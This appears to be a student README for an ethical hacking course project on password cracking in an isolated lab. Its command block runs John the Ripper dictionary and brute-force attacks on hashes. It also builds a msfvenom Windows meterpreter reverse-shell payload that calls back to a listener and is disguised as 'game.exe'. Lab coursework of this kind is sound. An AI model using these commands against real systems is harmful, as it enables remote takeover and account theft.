# Password Security and Cracking Assessment

This is my **Module 7 Ethical Hacking v13** project on password security and cracking, done in a controlled virtual lab for educational purposes only.

## Project Overview
- Assessed password security in a small lab network.
- Understood password hashing (MD5, SHA-256).
- Extracted and cracked hashes using **John the Ripper**.
- Tested dictionary and brute force attacks.
- Created and tested **Metasploit payloads**.
- Gave recommendations to improve password security.

## Lab Setup
- **Attacker**: Kali Linux
- **Target**: Metasploitable2 / DVWA
- **Network**: Host-only (isolated)

## Tools Used
- John the Ripper
- Metasploit Framework
- Rockyou wordlist

## Key Commands
```bash
# Dictionary attack
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Brute force attack
john hashes.txt --incremental

# Create payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > game.exe
